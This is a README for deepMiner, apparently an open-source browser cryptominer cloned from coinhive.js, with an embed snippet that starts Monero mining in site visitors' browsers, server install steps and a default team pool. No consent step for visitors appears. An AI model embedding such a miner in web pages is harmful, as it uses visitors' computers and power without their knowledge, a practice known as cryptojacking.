# deepMiner

```acsii
:::::::-.  .,:::::: .,::::::::::::::::. .        :   ::::::.    :::..,:::::: :::::::..
 ;;,   `';,;;;;'''' ;;;;'''' `;;;```.;;;;;,.    ;;;  ;;;`;;;;,  `;;;;;;;'''' ;;;;``;;;;
 `[[     [[ [[cccc   [[cccc   `]]nnn]]' [[[[, ,[[[[, [[[  [[[[[. '[[ [[cccc   [[[,/[[['
  $$,    $$ $$""""   $$""""    $$$""    $$$$$$$$"$$$ $$$  $$$ "Y$c$$ $$""""   $$$$$$c
  888_,o8P' 888oo,__ 888oo,__  888o     888 Y88" 888o888  888    Y88 888oo,__ 888b "88bo,
  MMMMP"`   """"YUMMM""""YUMMM YMMMb    MMM  M'  "MMMMMM  MMM     YM """"YUMMMMMMM   "W"

  deepMiner (idea from coinhive.js)
  Working on XMR(monero) and ETN(electroneum) personal wallet.
  By evil7@deePwn

----------------------------------------------------------------------------------------
```

## Usage

* Add some javascript and write like this :

```html
<script src="https://digxmr.com/deepMiner.js"></script>
<script>
    var miner = new deepMiner.Anonymous('deepMiner_test').start();
</script>
```

* All done! XD~ Let's build our srv by self

## Install

```bash
curl https://raw.githubusercontent.com/deepwn/deepMiner/master/install.sh > install.sh
sudo sh install.sh
```

lib request: `*nodejs` / `*npm` / `?nginx`

useful pakages: `forever`

ssl support: <https://certbot.eff.org/>

OS pass: `ubuntu(debian)`

## API

Same like this: <https://coinhive.com/documentation/miner> (JUST javascript API)

## Update

Just go `/srv/deepMiner` and run `git pull`

DON'T forget backup your `config.json` !!!

## Attention

Some VPS's default DNS can't find IP for the pool. Check your DNS setting if it's wrong.

SSL cert request default TRUE. Use `certbot` to quickly set it.

If not a bug just Qus in something setting or in install. Please write down at <https://github.com/deepwn/deepMiner/issues/8>

## Example & Some tips

<https://digxmr.com/demo.html>

Tips:

1. Choice another pool if you want: <https://github.com/timekelp/xmr-pool-choice>
1. Trying build own pool-Server too? <https://github.com/zone117x/node-cryptonote-pool>
1. If you want to create your own pool. check my blog it's maybe helpful to you. (just in chinese language now) 

blog1 <http://www.freebuf.com/column/151316.html>
blog2 <http://www.freebuf.com/column/151376.html>

## Team's pool

The pool `pool.elitexmr.com:8080` set in default. This pool created by team guy. (You can change to another in `config.json` with building it run `install.sh`. Or you can change it anytime.)

Rule for this team pool:

1. NO banned in this pool. This `deepMiner` object working in a web page. used to payback XMR for your website like the Ad payback. But you know people will NOT stay on just 1 page and will not take long time stay in website (If NOT online web game or online live show). So creater selected no banned in this pool.
1. The pool is total handoff. It automatic payments in XMR. Each and every address when the deepMiner reaches 0.3 until the next block. 
1. Low difficulty and more eazy for js miner.Stucked at `diff=256`.

## Source

```acsii
deepMiner.git
.
|-- README.md
|-- banner
|-- config.json
|-- LICENSE
|-- package-lock.json
|-- package.json
|-- server.js
|__ web
    |-- 404.html
    |-- deepMiner.js
    |-- demo.html
    |-- index.html
    |-- lib
    |   |-- cryptonight-asmjs.min.js
    |   |-- cryptonight-asmjs.min.js.mem
    |   |__ cryptonight.wasm
    |__ worker.js
```

## License

MIT <https://raw.githubusercontent.com/deepwn/deepMiner/master/LICENSE>

## Missions

Building a WebUI. Manage about miner status and banned rules pool setting or something
